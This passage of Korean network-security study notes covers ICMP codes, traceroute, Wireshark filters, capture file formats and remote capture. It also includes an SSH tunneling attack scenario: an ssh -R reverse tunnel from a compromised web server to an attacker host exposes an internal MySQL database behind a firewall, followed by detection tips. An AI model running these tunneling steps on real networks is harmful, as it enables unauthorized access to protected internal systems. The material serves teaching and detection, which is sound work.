    Code 1  = Host Unreachable
    Code 3  = Port Unreachable
    Code 13 = Administratively Prohibited (방화벽 차단)
  Type 8  = Echo Request (ping 요청)
  Type 11 = Time Exceeded (TTL 만료, traceroute에서 사용)

traceroute 동작 원리:
  TTL=1 패킷 → 첫 번째 라우터가 ICMP Type 11 반환 (라우터 IP 노출)
  TTL=2 패킷 → 두 번째 라우터가 ICMP Type 11 반환
  ... 목적지 도달 시 ICMP Type 0 (Echo Reply)

Wireshark 필터:
  icmp.type == 11   # TTL Exceeded → traceroute 경로 추적
  icmp.type == 3 && icmp.code == 13   # 방화벽 차단 확인
```

---

## 13. SSH 터널링 해킹 시나리오 (방화벽 우회)

### 시나리오: 방화벽 내부 DB 서버 접근
```
환경:
  공격자 PC    : 200.200.200.100
  공격자 SSH서버: 200.200.200.110
  피해 웹서버  : 100.100.100.100 (방화벽 허용)
  피해 DB서버  : 192.168.1.100  (방화벽 차단 - 사설IP)

전제조건:
  - 웹서버를 통한 웹 해킹으로 웹서버 장악
  - 웹서버의 DB 연결 스크립트에서 DB 접속 정보 획득
  - 방화벽이 DB 서버 직접 접근을 차단

공격 단계:
Step 1: 웹서버에서 공격자 SSH서버로 리버스 터널 생성
  (웹서버에서 실행)
  ssh -R 3306:192.168.1.100:3306 attacker@200.200.200.110
  → 공격자 SSH서버의 3306 포트 → 내부 DB서버 3306으로 포워딩

Step 2: 공격자 PC에서 SSH서버의 포워딩된 포트로 DB 접속
  mysql -h 200.200.200.110 -P 3306 -u dbuser -p

  또는 로컬 포워딩 추가:
  ssh -L 3306:localhost:3306 attacker@200.200.200.110
  mysql -h 127.0.0.1 -P 3306 -u dbuser -p
```

### SSH 터널링 탐지
```
네트워크 분석 포인트:
  1. 비표준 포트를 통한 SSH 연결 (22번이 아닌 포트)
  2. SSH 세션 내 비정상적으로 많은 데이터 전송
  3. 방화벽 로그에서 SSH 세션 지속 시간 이상
  4. 동일 SSH 세션에서 다양한 내부 서비스 접근 패턴

Wireshark 필터:
  tcp.port == 22 && tcp.len > 0    # SSH 데이터 전송
  # SSH는 암호화되어 내용 확인 불가 → 행위 패턴으로 분석
```

---

## 14. Wireshark 캡처 파일 형식 및 도구

### 지원하는 캡처 파일 형식 (입력)
```
libpcap / tcpdump (.pcap)      - 가장 범용적
pcapng (.pcapng)               - 향상된 pcap (메타데이터 포함)
Snort, Wireshark               - 자체 형식
Network Monitor (.cap)         - Microsoft
NetFlow                        - Cisco 트래픽 분석
```

### 데이터 내보내기 형식
```
File → Export Objects:
  HTTP   - HTTP를 통해 전송된 파일 추출 (이미지, 문서, 바이너리)
  SMB    - SMB를 통해 공유된 파일 추출
  DICOM  - 의료 영상 파일
  TFTP   - TFTP로 전송된 파일
  IMF    - 이메일 메시지

File → Export Specified Packets:
  필터된 패킷만 새 파일로 저장

File → Export Packet Dissections:
  Plain Text, CSV, PSML(XML), PDML(XML), C Arrays
```

### 캡처 중지 조건 설정 (Capture Options)
```
Stop capture after [N] packets   - 패킷 수 기준
Stop capture after [N] files     - 파일 수 기준
Stop capture after [N] megabytes - 파일 크기 기준
Stop capture after [N] seconds   - 시간 기준

Ring Buffer (파일 순환):
  Create a new file every [N] megabytes/seconds
  Ring buffer with [N] files → 오래된 파일 자동 삭제
  → 장기간 캡처 시 디스크 용량 관리에 유용
```

### 원격 인터페이스 캡처
```
rpcapd 데몬을 원격 머신에 설치 후:
Capture → Options → Add new interfaces → Remote interfaces
  Host: 원격 IP
  Port: 2002 (기본값)
  → 원격 서버의 트래픽을 로컬 Wireshark에서 분석
```
